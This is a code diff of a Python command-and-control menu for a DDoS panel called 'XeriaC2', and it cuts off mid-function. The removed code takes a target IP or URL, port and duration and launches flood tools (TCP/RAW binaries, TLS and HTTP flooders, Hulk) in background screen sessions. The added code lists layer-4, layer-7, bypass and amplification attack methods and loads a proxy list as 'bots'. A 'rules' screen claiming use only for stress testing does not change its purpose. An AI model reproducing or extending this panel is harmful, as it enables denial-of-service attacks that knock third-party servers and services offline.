@@ -1,869 +1,791 @@
-# -*- coding: utf-8 -*-
-from operator import index
+
+
 import socket
+import os
+import requests
 import random
-import string
-import threading
 import getpass
-import urllib
-import getpass
-from colorama import Fore, Back
-import os,sys,time,re,requests,json
-from requests import post
-from time import sleep
-from datetime import datetime, date
-import codecs
+import time
+import sys
 
-B = '\033[35m' #MERAH
-P = '\033[1;37m' #PUTIH
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+   Ｘｅｒｉａ
+
+
+
+
+
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+     Ｘｅｒｉａ
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+
+
+
+
+     Ｘｅｒｉａ                
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+
+  Ｘｅｒｉａ
+Ｘｅｒｉａ
+Ｘｅｒｉａ
+Ｘｅｒｉａ
+    """)
+    time.sleep(0.8)
+    clear()
+
+def si():
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mXeria \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to XeriaC2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Xeria \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+
+def tools():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+    
+def banners():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+
+def rules():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
+''')
+
+def ports():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
+''')
+
+def special():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')
+    
 def layer7():
-	os.system ("clear")
-	print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
-
-\033[37m[ LAYER - 7 ]
-\033[35mNOTE USE:
-METHODE [URL] [PORT] [TIME]
-
-\033[37m – STRIKE   – TLSV3 
- – BOMB2    – JAVA
- – BOMB     – HTTP
- – GOLDEN   – MIX
- – UAM 
- – TLS 
- – TLSV2
-
-""")
-
-def layer12():
-	os.system ("clear")
-	print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
-
-\033[37m[ LAYER - 12 ]
-\033[35mUSE FOR BOT COUNT
-
-\033[37m– BRUTAL [url] [time]
-– BOT [url] [time]
-– BOT2 [url] [time]
-
-""")
-
-def VVIP():
-	os.system ("clear")
-	print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
-
-\033[37m[ VVIP ]
-\033[35mNOTE USE:
-METHODE [URL] [PORT] [TIME]
-
-\033[37m– HTTPS
-– HTTPS2
-– BYPASS
-– BROWSER
-– KILLNET
-
-""")
+    clear()
+    si()
+    print(f'''
+               ╔═══════════════════════╗
+               ║ - - M E T H O D S - - ║
+ ╔═╦═══════════╬═══════════╦═══════════╬═══════════╦═╗
+ ║A║  HTTP-API ║  HTTP-PRO ║   ovh     ║  HTTP-GET ║R║
+ ║P║           ║   TLS     ║           ║  HTTP-POST║A║
+ ║I║           ║  xeriatls ║           ║  HTTP-RAW ║W║
+ ╚═╣           ║ STRONG-GO ║           ║           ╠═╝
+   ║           ║   Tlsv1   ║           ║           ║
+   ║           ║   BYPASS  ║           ║           ║
+   ║           ║           ║           ║           ║
+   ║           ║           ║           ║           ║
+   ║           ║           ║           ║           ║
+   ║           ║           ║           ║           ║
+   ║           ║           ║           ║           ║
+   ║           ║           ║           ║           ║
+''')
 
 def layer4():
-	os.system ("clear")
-	print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
+    clear()
+    si()
+    print(f'''
+                    GAME                     TCP                       UDP
+             ╔═════════════════════╦  ╦═════════════════════╦   ╦═════════════════════╗
+             ║       GTA           ║  ║     TCP             ║   ║     UDP-BYPASS      ║
+             ║     MINECRAFT       ║  ║    TCPSYN           ║   ║       UDP           ║
+             ║      GAME           ║  ║   TCP-STRONG        ║   ║  <empty>            ║
+             ╚═════════════════════╩  ╩═════════════════════╩   ╩═════════════════════╝
 
-\033[37m[ LAYER - 4 ]
-\033[35mNOTE USE: 
-mode   [1/2/3]
-method [GET/POST/HEAD]
-            
+''')
 
-\033[37m – STRESS [ip] [port] [mode] [time]
- – TCP [ip] [port] [time] [method]
- – OVH [ip] [port] [time] [method]
+def amp_games():
+    clear()
+    si()
+    print(f'''
+                              \x1b[38;2;0;212;14m╔═══════════════╗
+                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+''')
 
-
-""")    
-
-def help():
-	os.system ("clear")
-	print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
-
-\033[37m[ MENU BIGBANG-PANNEL ]
-HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS
-
-[LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
-\033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
-• BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]
-• BOMB          • OVH           • BOT2 [\033[32mVIP\033[35m]    • BYPASS [\033[32mVVIP\033[35m]
-• GOLDEN                                        • BROWSER [\033[32mVVIP\033[35m]
-• UAM                                           • KILLNET [\033[32mVVIP\033[35m]
-• TLS [\033[32mVIP\033[35m]
-• TLSV2 [\033[32mVIP\033[35m]
-• TLSV3 [\033[32mVIP\033[35m]
-• JAVA
-• HTTP [\033[32mVIP\033[35m]
-• MIX [\033[32mVIP\033[35m]
-
-""")
 
 def menu():
-    os.system ("clear")
+    sys.stdout.write(f"         \x1b]2;Xeria C2 --> Admin: [1] | Online Users: [1] | Methods: [10] | Bypass: [3] | Amps: [1]\x07")
+    clear()
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mXeria \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to XeriaC2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner : Xeria \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.0')
+    print("")
     print("""
-\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - XeriaC2
-\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK Xeria
-\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
-\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
-\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-\033[37m     `''''MMMMM\033[35m88&&&&''''`
-\033[37m           'MMM\033[35m8&&&'
-
-
-\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
+ 
+                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
+                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to Xeria C2 DDoS Panel      \x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mBest XeriaC2 DDoS Panel\x1b[38;2;0;212;14m - - - - -\x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
+                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
+                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239m            Best XeriaC2             \x1b[38;2;0;49;147m║
+                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
+                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
+                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝             
+    
+ 
 """)
-
-
 
 def main():
+    menu()
+    while(True):
+        cnc = input('''\x1b[38;2;0;212;14m╔══Xeria@C2\n╚==>''')
 
-	while True:
-		sys.stdout.write(f"\x1b]2;[/] XeriaC2 :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
-		sin = input("\033[0;30;45mXeriaC2@admin\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
-		sinput = sin.split(" ")[0]
-		if sinput == "clear":
-			os.system ("clear")
-			menu()
-		if sinput == "cls" or sinput == "CLS":
-			os.system ("pkill screen")
-			os.system ("clear")
-			menu()
-		if sinput == "stop" or sinput == "STOP":
-			os.system ("pkill screen")
-			menu()			
-		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
-			layer12()
-		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
-			VVIP()
-		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
-			layer7()
-		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
-			layer4()
-		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
-			help()
-		if sinput == "plan":
-			plant()
-		elif sinput == "":
-			main()
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+            layer4()
+        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
+            amp_games()
+        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
+            special()
+        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
+            rules()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()
+        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
+            ports()
+        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
+            tools()
+        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
+            banners()
 
-#########LAYER-4########
-		elif sinput == "stress" or sinput == "STRESS":
-			try:
-				ip = sin.split()[1]
-				port = sin.split()[2]
-				method = sin.split()[3]
-				time = sin.split()[4]
-				os.system(f'cd .resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
-\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "tcp" or sinput == "TCP":
-			try:
-				ip = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				method = sin.split()[4]
-				os.system(f'cd .resources && screen -dm ./TCP {method} {ip} {port} {time} 15000')
-				os.system(f'cd .TC1 && screen -dm ./TCP {method} {ip} {port} {time} 7000')
-				os.system(f'cd .TC2 && screen -dm ./TCP {method} {ip} {port} {time} 10000')
-				os.system(f'cd .resources && screen -dm./RAW {method} {ip} {port} {time} 15000')
-				os.system(f'cd .TC1 && screen -dm ./RAW {method} {ip} {port} {time} 7000')
-				os.system(f'cd .TC2 && screen -dm ./RAW {method} {ip} {port} {time} 10000')
-				os.system(f'cd /media && screen -dm ./RAW {method} {ip} {port} {time} 7000')
-				os.system(f'cd /media && screen -dm ./TCP {method} {ip} {port} {time} 7000')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "ovh" or sinput == "OVH":
-			try:
-				ip = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				method = sin.split()[4]
-				os.system(f'cd .resources && ./RAW {method} {ip} {port} {time} 15000')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
+# LAYER 4 METHODS   
 
-#########LAYER-7########  
-		elif sinput == "strike" or sinput == "STRIKE":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
-				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
-				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
-				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 8 1')
-				os.system(f'cd /media && screen -dm go run strike.go -url {host} GET')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "java" or sinput == "JAVA":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .randomstring && cd examples && java input2.java {host} 8000')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "tls" or sinput == "TLS":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
-				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 8')
